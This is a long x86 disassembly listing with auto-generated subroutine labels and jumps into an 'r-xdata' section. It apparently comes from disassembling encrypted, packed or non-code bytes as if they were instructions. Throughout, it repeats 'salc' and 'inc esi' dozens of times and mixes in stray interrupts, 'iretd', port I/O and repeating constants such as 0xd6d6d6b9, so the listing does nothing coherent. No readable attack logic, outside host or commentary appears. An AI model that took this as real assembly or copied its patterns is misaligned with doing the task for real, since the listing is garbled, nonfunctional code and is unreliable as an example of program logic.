in eax 0xe
inc esi
inc esi
salc
salc
pop ds
scasd [ edi ]
clc
jge r-xdata
inc esi
salc
salc
salc
salc
salc
salc
lds eax [ esp + eax * 2 + 0x467fedaf ]
inc esi
salc
salc
int 0x9c
and bh cl
sbb ebp [ edx + 0x465ab2af ]
inc esi
salc
salc
salc
salc
salc
and bh cl
sbb esp [ esi + 0x6848af1d ]
inc esi
inc esi
salc
salc
salc
salc
salc
mov ecx 0x464682f1
inc esi
scasb [ edi ]
xor ch [ esi + eax * 2 + 0x46 ]
scasd [ edi ]
movsb [ edi ] [ esi ]
push eax
inc esi
inc esi
salc
salc
salc
salc
salc
salc
sub_466fa4
pop ss
dec eax
inc esi
inc esi
scasd [ edi ]
jg r-xdata
add esi [ edx + 0x464487af ]
inc esi
salc
salc
salc
salc
mov ecx 0xae115e11
push esp
dec ebx
inc esi
inc esi
pop ds
iretd
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x46
mov ecx 0xb95e6232
adc [ edx ] dh
scasd [ edi ]
adc al 0xbf
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
retn
sub_467017
add edi [ edx - 0x79507a83 ]
push ebx
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
iretd
sub_46707e
mov [ 0xffffffff88cdb075 ] al
int 0x99
xchg ebp eax
mov ebp 0x46672caf
inc esi
salc
salc
salc
salc
salc
salc
salc
push ss
iretd
sub_467095
add edi [ esi - 0x504dfc35 ]
scasd [ edi ]
inc edi
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc

sub_4670aa
add esp [ edx - 0x31fc34ea ]
push ss
adc eax 0x464750af
inc esi
salc
salc
salc
salc
salc
salc
push [ esi + 0x46 ]
inc esi
inc esi
and cl ch
inc edi
int 0x6
dec edx
int 0x6
dec edx
int 0x46
int 0x6
pop esi
iretd
sub_4670d3
int 0x42
bound ebx [ edi ]
test esi edx
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x2
iretd
sub_4670fa
push ss
cmovbe eax [ esi - 0x71 ]
test esi edx
salc
salc
salc
adc ecx ebp
stosb [ edi ]
scasd [ edi ]
arpl [ eax + 0x46 ] si
inc esi
salc
salc
salc
salc
scasb [ edi ]
mov al [ ebp + 0x46 ]
inc esi
lds eax [ edx - 0x3c6132aa ]
mov ecx 0x59bdc249
inc esi
inc esi
retn
sub_467128
inc esi
inc esi
scasd [ edi ]
fdiv [ ebp + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
and bh cl
or ecx [ edx + 0x466b2aae ]
inc esi
scasd [ edi ]
sub eax 0xd6464645
salc
salc
salc

sub_46719a
inc esi
inc esi
scasd [ edi ]
sbb edi [ ebx - 0x30ee4647 ]
add [ edx - 0x52 ] bl
jno r-xdata
inc esi
dec ecx
int1
dec esp
stc
sbb al 0x31
inc esi
inc esi
and [ ebp - 0x77 ] bh
dec ecx
retn 0x4648
inc esi
inc esi
mov edx [ cs : edi + 0x44 ]
and edx [ ecx ]
iretd
sub_4671b1
add [ esi - 0x52 ] ah
outsd
inc ebp
inc esi
inc esi
rcl [ cs : ebp + 0x67 ] 0x1
clc
adc edi ecx
add [ esi - 0x52 ] cl
pop ebp
inc ebp
inc esi
inc esi
scasd [ edi ]
bound edx [ edi + 0x46 ]
inc esi
salc
salc
adc eax 0x1515422c
scasd [ edi ]
dec edi
push edi
inc esi
inc esi
adc [ ecx ] dl
adc al 0xf8
loope r-xdata
salc
salc
salc
salc
salc
salc
jne r-xdata
and [ eax ] ecx
scasb [ edi ]
mov al 0x59
inc esi
inc esi
pop ds
lds edi [ esi + 0x63c04944 ]
inc esi
inc esi
inc esi
dec ecx
int1
dec esp
stc
sbb al 0x31
inc esi
inc esi
and [ ebp - 0x77 ] bh
dec ecx
retn 0x4648
sub al 0x2
iretd
scasd [ edi ]
jle r-xdata
sahf
retn
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
jne r-xdata
pop [ ebp - 0x2929292a ]
adc ecx ebp
stosb [ edi ]
scasd [ edi ]
arpl [ eax + 0x46 ] si
inc esi
salc
salc
salc
salc
scasb [ edi ]
mov al [ ebp + 0x46 ]
inc esi
lds eax [ edx - 0x3c6132aa ]
mov ecx 0x59bdc249
inc esi
inc esi
retn
scasd [ edi ]
in eax dx
pop esp
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x7b8f
sub_467209
inc eax
inc esi
inc esi
inc esi
lds eax [ esp + eax * 2 - 0x3cbb513b ]
xchg [ edi + 0x46467a84 ] ch
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
cmp ecx [ esi + 0x466ccbaf ]
inc esi
salc
salc
salc
salc
int 0x85
and bh cl
add ebx [ esi - 0x30df7833 ]
add ebx [ ebp + ecx * 8 + 0x3cf2080 ]
0xcd302c1e 0x20be
iretd
sub_467253
cmp ebx [ eax + 0x7afb8cd ]
mov cl 0xb9
mov ecx 0xbcdd6d6
dec esi
int 0x3
mov edx 0x45c052cd
xchg edi eax
scasb [ edi ]
das
mov ecx 0x37db9b9
dec edx
dec ecx
retn 0x6b3b
sub_467275
inc esi
inc esi
mov ecx 0x63afba03
dec edx
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
push ss
sub al 0xb9
mov ecx 0xbfafaa33
add al 0x46
inc esi
and bh cl
adc edi esp
sbb al 0x2c
and ah [ eax ]
iretd
sub_4672a9
inc esi
inc esi
scasd [ edi ]
inc eax
popad
inc esi
inc esi
salc
mov ecx 0xcfaf1630
mov esi 0xd6d6b9b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
iretd
sub_4672ca
add edi [ edx + 0x464646fe ]
inc esi
scasd [ edi ]
std
jne r-xdata
salc
salc
salc
salc
salc
salc
adc ecx ebp
stosb [ edi ]
scasd [ edi ]
or eax 0xd6464675
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc ch cl
mov dh 0x49
retn 0x464b
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
retn
sub_4672e6
xchg [ edi + 0x46464a62 ] ch
salc
salc
salc
salc
dec ecx
int1
push edi
and bh cl
push esi
and bl al
xchg esp eax
scasd [ edi ]
add al 0x1
inc esi
inc esi
salc
salc

sub_467303
mov ebx 0xa3aeb9b9
mov ecx 0xdfafb9b9
mov ebx 0xd6d6b9b9
salc
salc
insd
sub [ edi + 0x46466c49 ] 0xd6d6d6d6
salc
salc
adc ecx ebp
stosb [ edi ]
scasd [ edi ]
or eax 0xd6464675
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc ch cl
mov dh 0x49
retn 0x464b
sub_46735c
mov ch 0xb9
mov ecx 0x49b46db9
int1
dec esp
scasd [ edi ]
sahf
imul eax [ esi + 0x46 ] 0x15
scasd [ edi ]
rcr [ esi + 0x46 ] 0x46
salc
salc
salc
dec ecx
retn 0x4b1f
sub_467377
inc esi
inc esi
scasd [ edi ]
push ss
bound eax [ esi + 0x46 ]
salc
sub al 0x46
mov ecx 0x4646ead0
inc esi
inc esi
inc edi
inc esi
inc esi
scasd [ edi ]
push ebp
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
add al [ edi + 0x46 ]
inc esi
lds eax [ edx + 0x7d40cf52 ]
test [ ecx - 0x3e ] ecx
rol [ esi + eax * 2 + 0x46 ] 0xfe
pop ds
push ss
inc esi
inc esi
and bh cl
add [ esi - 0x33 ] cl
add edx [ esi + 0xe ]
dec ecx
int1
xchg esi eax

sub_4673d5
add edx [ esi - 0x31 ]
add edi [ edx + 0x42ba03c5 ]
dec ecx
int1
test bl cl
push ds
inc esp
sub eax 0x7baf4386
js r-xdata
and bh cl
add edx [ eax - 0x4df430e0 ]
sub al 0x23
push ds
sub al 0x2a
and bh cl
add esi [ eax - 0x50dfd3e2 ]
cwde
dec esp
inc esi
inc esi
salc
salc
jne r-xdata
inc esi
salc
salc
salc
salc
salc
int 0xfe
xchg [ esi + 0x46 ] al
inc esi
int 0xa
bound edx [ esi - 0x33 ]
xchg ecx eax
scasb [ edi ]
movsd [ edi ] [ esi ]
pop ebx
inc esi
inc esi
retn

and bh cl
add edi [ ebx + ecx * 8 - 0x46446d3d ]
mov ecx 0x467d8caf
inc esi
salc
salc
salc
adc ch cl
mov bh 0xc3
mov al 0xaf
inc edi
dec ebp
inc esi
inc esi
salc
salc
salc
mov ecx 0x4646ead1
inc esi
sub al 0x22
scasd [ edi ]
rol [ ebp + 0x46 ] cl
inc esi
sub al 0x36
scasd [ edi ]
push 0xd6464644
salc
salc
dec ecx
retn 0x635c
sub_467488
inc esi
inc esi
jne r-xdata
cwde
dec ecx
0xb998
pop [ ebp + 0x46ead1b9 ]
inc esi
inc esi
sbb [ ebp - 0x3151e92a ] eax
push esi
inc esi
inc esi
int 0x3
push esi
lds esp [ ebx ]
mov esi 0x4a82c546
sub al 0x46
scasd [ edi ]
xor [ edi + 0x46 ] ebp
inc esi
salc
pop ds
retn
sub_46750a
inc esi
lds eax [ edx + 0x6202cf4a ]
pop esi
scasd [ edi ]
fwait
arpl [ esi + 0x46 ] ax
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
sbb edi [ eax + 0x201d2b2c ]
iretd
sub_467541
sbb eax [ edx + 0x2c ]
jo r-xdata
mov ecx 0x64b20381
arpl [ edx ] bp
and bh cl
sbb eax [ eax + 0x2c ]
jb r-xdata
xor eax 0x64be0381
arpl [ fs : edi + 0x46464b50 ] bp
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
push ds
and bh cl
add esi [ eax + 0x201e242c ]
iretd
and bh cl
sbb ecx [ esi - 0x51 ]
push ecx
push ebx
inc esi
inc esi
int 0xe
inc edx
dec ecx
int1
dec edi
lds edi [ edi - 0x4a8a5089 ]
mov ecx 0xb20381b9
arpl [ fs : edx ] bp
sub_4675b0
add edi [ esi - 0x50e1cad4 ]
mov ah 0x45
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sbb al 0x20
iretd
sub_46760d
xchg edi eax
jle r-xdata
salc
salc
salc
dec ecx
rol [ edi - 0x463a4033 ] cl
inc edi
dec ecx
retn
inc esi
sbb ebp ecx
sbb [ eax ] 0x85
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
cmp esi eax
sub al 0xb
sbb [ edi + 0x4646703c ] ebp
jne r-xdata
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sbb al 0x20
iretd
sbb [ 0x13d6858f ] bl
scasd [ edi ]
popad
jpe r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
pop ss
pop ss
int 0x3
dec esi
iretd
inc esi
and bh cl
adc esi [ esi - 0x30df6b8b ]
adc esi [ esp + ebx - 0x30dfd5d4 ]
adc ecx [ esi + 0x464cd9af ]
inc esi
salc
salc
sub_467677
fidiv [ eax + 0x3cbb9b9 ]
cli
scasd [ edi ]
sbb ecx [ esi + eax * 2 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
pop ss
pop ss
int 0x3
dec esi
iretd
sub_4676a5
add edi [ edx - 0x5045fc33 ]
jge r-xdata
mov ecx 0x6a02c249
inc esi
inc esi
scasd [ edi ]
rol [ ecx ] cl
inc esi
inc esi
int 0xbf
and bh cl
cmp eax [ edi + ebp * 4 + 0x464675f1 ]
salc
adc [ edi + 0x46466511 ] ebp
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sbb [ esp + eax ] ebp
and bh cl
adc ebx esi
scasd [ edi ]
push 0xffffffb7
mov ecx 0xcbd6d6b9
adc ebx [ edx - 0x464dbb52 ]
mov ecx 0x464097af
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x4643
inc esi
inc esi
and bh cl
adc ebx [ edx + 0x202a2c1c ]
iretd
sub_467783
cmp ah [ edx + 0x56 ]
lds edi [ edx ]
bound ebp [ edx + 0x47 ]
mov ecx 0x58af7635
pop esp
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
xchg ebp eax
mov ebp 0x44e80c5
into
sbb dl [ ebx - 0x1f ]
lds edi [ eax + 0x7c44966 ]
jb r-xdata
push cs
inc esi
mov ecx 0x3bc5ba03
mov edx 0xcac44945
jns r-xdata
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x58
sub al 0xb9
scasd [ edi ]
mov bl 0x4b
inc esi
inc esi
salc
salc
salc
dec ecx
retn 0x6ef1
inc esi
inc esi
salc
salc
mov ecx 0x91af4e11
xor [ ecx + 0x231efe03 ] al
sub [ eax ] dl
scasd [ edi ]
mov [ esi + 0x46 ] 0xb9d6d646
adc [ esi - 0x51 ] ecx
xchg ecx eax
inc esi
into
add esi edx
into
add esp [ edx - 0x317dfc32 ]
add edx [ edx - 0x3451f435 ]
add ebp esi
add [ ebx ] 0xb100dae
or eax 0x10aa0381
or ecx [ 0x3812010 ]
mov dh 0xb
inc esi
add [ ebx ] 0x252f0b9e
xor al 0x81
add ebx [ edx + 0x20293529 ]
add [ ebx ] 0xe6632a6
sub_467849
add ecx [ edx - 0x15cc30e0 ]
scasd [ edi ]
mov al 0x48
inc esi
inc esi
salc
salc
salc
salc
salc
salc
inc esi
jbe r-xdata
add ecx [ edx + 0x23363f2e ]
add [ ebx ] 0x66303496
scasw [ edi ]
add [ ebp + 0x46 ] esp
inc esi
salc
salc
retn
inc esi
inc esi
push esi
inc esi
inc esi
adc eax 0x46c6d1b9
inc esi
inc esi
push ss
add [ esi + 0x41 ] 0xb9464746
xor esp [ esi + 0x467859af ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
add [ edi + 0x46464461 ] ebp
salc
salc
salc
salc
add [ ebx ] 0x1e0b0bfa
and eax [ ecx + 0x10288603 ]
or ecx [ ebx ]
add [ ebx ] 0x2a34368e
add [ ebx ] 0x2e8a
aas
and eax [ ss : ecx + 0x30349603 ]
scasw [ edi ]
sub_4678b9
xchg [ ecx - 0x3e ] cl
imul [ ecx + 0x46 ]
inc esi
push ss
scasd [ edi ]
pop ecx
inc edx
inc esi
inc esi
int 0xe
dec esi
int 0x81
scasb [ edi ]
inc eax
add al 0x46
inc esi
scasd [ edi ]
ja r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
pop ds
sub al 0x21
int 0x84
scasd [ edi ]
and eax 0xd646466f
dec ecx
retn
inc esi
inc esi
salc
salc
salc
salc
sub_4678f4
mov ecx 0xaf472cb9
pop ebx
jge r-xdata
salc
salc
scasb [ edi ]
0xc546464d 0x4a82
scasd [ edi ]
cmpsd [ esi ] [ edi ]
add eax 0xd6d64646
int 0x97
scasd [ edi ]
mov [ 0xffffffffd6b9b9ba ] al
salc
salc
jne r-xdata
inc esi
salc
salc
salc
salc
salc
iretd
pop ds
sub al 0x21
int 0x84
scasd [ edi ]
and eax 0xd646466f
dec ecx
retn
push es
test edi esi
scasd [ edi ]
mov dh 0x3
inc esi
inc esi
salc
salc
inc esi
jbe r-xdata
and bh cl
sbb edi [ eax - 0x30df6333 ]
sbb esp esi
sub al 0x35
int 0x9f
and bh cl
sbb esp esp
int 0x9c
and bh cl
sbb esp edx
sbb eax 0xcf20322c
sbb esp eax
sbb eax 0x98af352c
mov ch 0xb9
mov ecx 0xaacd13d6
lds ebp [ edx + 0x42edaf52 ]
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
add edi [ ebp + esi * 2 + 0x71a8af86 ]
inc esi
inc esi
lds edi [ esi + 0x5cc24947 ]
push es
inc esi
inc esi
sbb ah [ bp + si + 0x56 ]

scasd [ edi ]
arpl [ edi + 0x46 ] sp
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
jne r-xdata
inc esi
scasd [ edi ]
xlat
mov edi 0xd6d6b9b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub_467ae0
xchg [ ecx - 0x3e ] cl
cmp [ ebx + 0x46 ] dh
inc esi
scasd [ edi ]
r-xdata
adc esp [ ebp + ecx * 8 + 0x13cf2096 ]
mov [ 0x4668baaf ] al
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0xd1b95633
mov dl 0x46
inc esi
inc esi
sbb [ eax ] ebx
sbb eax 0xd6d6858f
lds eax [ edx + 0x7602cb4a ]
pop esi
scasd [ edi ]
insd
jpe r-xdata
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
aaa
adc dh dh
jbe r-xdata
xchg edx eax
push ds
and ebp [ eax ]
adc [ ecx + 0xb0b9e03 ] al
push ds
and eax [ ecx + 0x10289a03 ]
or ecx [ ebx ]
scasb [ edi ]
jecxz r-xdata
inc esi
salc
pop [ ebp - 0x2929292a ]
salc
salc
salc
salc
add [ ebx ] 0x464647ba
inc esi
sub al 0x76
pop ds
and cl ch
inc edi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
iretd
inc esi
inc esi
lds eax [ edi - 0x41ae514a ]
mov ecx 0x7205cdb9
pop ds
retn
inc esi
inc esi
sbb [ eax ] ebx
sbb eax 0x45af86c3
push esp
inc esi
inc esi
salc
salc
salc
salc
adc ebp [ edi + 0x464604aa ]
salc
salc
salc
salc
and bh cl
add esp [ edx + 0x20322c1e ]
iretd
sub_467b03
inc eax
scasb [ edi ]
sahf
mov edi 0x2d2eb9b9
adc dh dh
jbe r-xdata
salc
salc
salc
int 0xbf

mov bl 0x5e
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
adc esp [ ebp + ecx * 8 + 0x13cf2096 ]
mov [ 0x4668baaf ] al
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0xd1b95633
mov dl 0x46
inc esi
inc esi
sbb [ eax ] ebx
sbb eax 0xd6d6858f
lds eax [ edx + 0x7602cb4a ]
pop esi
scasd [ edi ]
insd
jpe r-xdata
xchg edx eax
push ds
and ebp [ eax ]
adc [ ecx + 0xb0b9e03 ] al
push ds
and eax [ ecx + 0x10289a03 ]
or ecx [ ebx ]
scasb [ edi ]
jecxz r-xdata
inc esi
salc
pop [ ebp - 0x2929292a ]
salc
salc
salc
salc
add [ ebx ] 0x464647ba
inc esi
sub al 0x76
pop ds
and cl ch
inc edi
inc esi
inc esi
lds eax [ edi - 0x41ae514a ]
mov ecx 0x7205cdb9
pop ds
retn
inc esi
inc esi
sbb [ eax ] ebx
sbb eax 0x45af86c3
push esp
inc esi
inc esi
salc
salc
salc
salc
adc ebp [ edi + 0x464604aa ]
salc
salc
salc
salc
and bh cl
add esp [ edx + 0x20322c1e ]
iretd
sub_467b90
inc esi
inc esi
scasd [ edi ]
popad
dec eax
inc esi
inc esi
salc
salc
salc
salc
int 0xb
mov edx 0x466458af
inc esi
salc
salc
add [ ebx ] 0xd0b10ae
adc [ ecx + 0xd0baa03 ] al
adc [ ebx ] cl
add [ ebx ] 0x28231e92
adc [ ecx + 0xb0b9e03 ] al
push ds
and eax [ ecx + 0x10289a03 ]
or ecx [ ebx ]
scasb [ edi ]
jecxz r-xdata
inc esi
inc esi
lds eax [ edi - 0x41ae514a ]
mov ecx 0x7205cdb9
pop ds
retn
inc esi
inc esi
sbb [ eax ] ebx
sbb eax 0x45af86c3
push esp
inc esi
inc esi
salc
salc
salc
salc
adc ebp [ edi + 0x464604aa ]
salc
salc
salc
salc
and bh cl
add esp [ edx + 0x20322c1e ]
iretd
sub_467ccd
inc ecx
inc esi
inc esi
inc esi
adc eax 0x46ead0b9
inc esi
inc esi
scasd [ edi ]
cmp eax [ eax + 0x46 ]
inc esi
pop [ ebp - 0x2929292a ]
salc
salc
adc [ ecx - 0x6132d9f0 ] edi
retn
sub_467cf1
inc esi
inc esi
mov ecx 0xb911ba33
ror dh 0x1
inc esi
inc esi
inc esi
scasd [ edi ]
loop r-xdata
mov ecx 0xa603cb16
push ss
scasd [ edi ]
movsd [ edi ] [ esi ]
arpl [ esi + 0x46 ] ax
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
push ss

inc esi
inc esi
into
inc edx
jg r-xdata
retn
xchg esp eax
int 0x87
scasd [ edi ]
pop edi
jns r-xdata

inc esi
salc
sbb [ esi + edi ] ebp
sbb al 0xaf
shl [ ebx + 0x46 ] cl
inc esi
salc
adc ecx ebp
stosb [ edi ]
pop ss
scasd [ edi ]
pop ds
mov eax 0xd6d6b9b9
salc
salc
salc
adc ecx ebp
stosb [ edi ]
lds ebp [ edx + 0x63d4af5a ]
inc esi
inc esi
dec ecx
retn 0xba63
sub_467d36
mov ecx 0x8f8675b9
test esi edx
salc
salc
salc
salc
salc
scasb [ edi ]
cwde
inc ecx
inc esi
inc esi
scasd [ edi ]
xor al 0x5f
inc esi
inc esi
salc
salc
salc
salc
salc
salc

sub_467d54
mov esi 0xafb9b9bb
cli
jle r-xdata
mov ecx 0x563eaf16
inc esi
inc esi
salc
salc
salc
salc
scasd [ edi ]
mov esp 0xd6d6b9b9
salc
salc
salc
salc
salc
salc
salc
sbb [ eax ] ebx
sbb eax 0x465c20af
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x33
and bh cl
adc ebp [ edx + 0x13cf201c ]
test al 0xaf
add [ ebp + 0x46 ] ebx
inc esi
salc
salc
salc
salc
salc
salc
inc esi
salc
scasb [ edi ]
and dh [ edx + 0x46 ]
inc esi
lds edi [ esi - 0x48a750fa ]
mov ecx 0xd6d6d6b9

sub_467d7c
cmp bh [ ebx - 0x34e94647 ]
add esp [ esi + 0x63a5af16 ]
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
push ss

sub_467dfa
cmp edx [ esi + 0x44 ]
scasd [ edi ]
push edx
test al 0xb9
mov ecx 0xd6d6d6d6
salc
cli
popfd
in eax dx
sti
adc edi ecx
clc
add [ esi + 0x46 ] 0x46
iretd
sub_467e14
fadd st6
inc esi
inc esi
inc esi
scasb [ edi ]
test [ eax + 0x1c2eb9b9 ] esi
test eax 0xf0afab19
pop edi
inc esi
inc esi
int 0x6
mov esi 0x17ba0345
scasd [ edi ]
loope r-xdata
mov ecx 0xb77bafb9
mov ecx 0xd6d6d6b9
salc
lds eax [ edx + 0x623ac556 ]
push edx
inc edi
dec ecx
retn
inc esi
inc esi

sub_467edb
add ah [ edx + 0xa ]
scasd [ edi ]
sbb al 0x43
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
push ss
mov ecx 0x1bcfa233
0xb9b74daf 0xd6b9
jne r-xdata
push es
scasd [ edi ]
cli
pop ecx
inc esi
inc esi
salc
salc
salc
dec ecx
retn
scasd [ edi ]
test al 0x62
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x7abf
sub_467f14
inc esi
inc esi
scasd [ edi ]
and dh [ esi + eax * 2 + 0x46 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
add edi [ esi - 0x5097d3e2 ]
insb
inc esi
inc esi
salc
salc
salc
salc
salc
salc
iretd
sub_467fd5
mov dh 0xbd
mov ecx 0xb554aeb9
mov ecx 0x427bafb9
inc esi
inc esi
salc
salc
salc
adc eax 0x4647a4af
inc esi
salc
salc
salc
salc
salc
int 0x80
scasd [ edi ]
cmp al 0x6e
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x8ec52210
inc esp
push ss
scasd [ edi ]
cmp dh [ edi + 0x46 ]
inc esi
salc
salc
salc
push ds
sub al 0x23
and bh cl
add edx [ esi + ebx - 0x30dfd7d4 ]
add edx [ edx - 0x50cdd3e2 ]
mov dh 0x5f
inc esi
inc esi
salc
salc
iretd
sub_468485
add ebx [ eax + 0x46708daf ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
retn
sub_468497
xchg [ ecx - 0x3e ] cl
inc ebx
inc esi
inc esi
inc esi
jne r-xdata

and bh cl
dec esi
test esi edx
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x4646ead0
inc esi
iretd
sub_4684c6
add esp [ esi - 0x59fc7eea ]
daa
and dh [ eax ]
daa
add [ ebx ] 0x752f36a2
je r-xdata
sub [ ebx - 0x29294647 ] esp
adc eax 0x757a10b9
xchg [ edi + 0x3b ] bh
mov edx 0x1986d249
sbb eax 0xcd13858f
stosb [ edi ]
add ebp [ esi + 0xe10b946 ]
int 0x9e
retn
sub_4684e6
mov ecx 0xa1252eb9
dec ebp
xlat
adc eax 0xb9a9a8ae
mov ecx 0x3bb3ed2e
jpe r-xdata
imul esp [ ebp + 0xcf1159 ] 0x6e
scasb [ edi ]
sub [ ecx + 0x152eb9b9 ] 0xafb44fd8
insb
mov bl 0xb9
mov ecx 0x6eaf13d6
push edx
inc esi
inc esi
salc
and bh cl
cmp esi [ edx - 0x30df4733 ]
cmp esi [ eax + 0x466db4af ]
inc esi
dec ecx
retn
iretd
sub_4684fa
sar [ edx - 0x51b9b9ba ] 0x9b
test eax 0x42afb9b9
pop ebx
inc esi
inc esi
salc
salc
salc
in eax 0x6b
movsd [ edi ] [ esi ]
pop ecx
adc edi ecx
add [ esi - 0x52 ] ch
sub [ ecx + 0x152eb9b9 ] 0xafb44fd8
insb
mov bl 0xb9
mov ecx 0x6eaf13d6
push edx
inc esi
inc esi
salc
and bh cl
cmp esi [ edx - 0x30df4733 ]
cmp esi [ eax + 0x466db4af ]
inc esi
dec ecx
retn
sub_46853d
loope r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x9aaf6611
je r-xdata
inc esi
inc esi
jne r-xdata
cmp edi [ esi + 0x46cad0b9 ]
inc esi
inc esi
retn
inc esi
salc
salc
salc
salc
dec ecx
retn 0x4c33
add [ ebx ] 0x302227a6
daa
add [ ebx ] 0x752f36a2
je r-xdata
scasd [ edi ]
movsd [ edi ] [ esi ]
dec ebx
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
jne r-xdata
sub [ ebx - 0x29294647 ] esp
adc eax 0x757a10b9
xchg [ edi + 0x3b ] bh
mov edx 0x1986d249
sbb eax 0xcd13858f
stosb [ edi ]
add ebp [ esi + 0xe10b946 ]
int 0x9e
retn
inc esi
salc
salc
salc
in eax 0x6b
movsd [ edi ] [ esi ]
pop ecx
adc edi ecx
add [ esi - 0x52 ] ch
sub [ ecx + 0x152eb9b9 ] 0xafb44fd8
insb
mov bl 0xb9
mov ecx 0x6eaf13d6
push edx
inc esi
inc esi
salc
and bh cl
cmp esi [ edx - 0x30df4733 ]
cmp esi [ eax + 0x466db4af ]
inc esi
dec ecx
retn
adc [ edi + 0x46464e52 ] ch
scasb [ edi ]
inc ebx
mov al [ 0xffffffffcb16b9b9 ]

sub_468566
mov esi 0xd2aeb9b9
pop eax
inc esi
inc esi
scasd [ edi ]
push ebx
insd
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
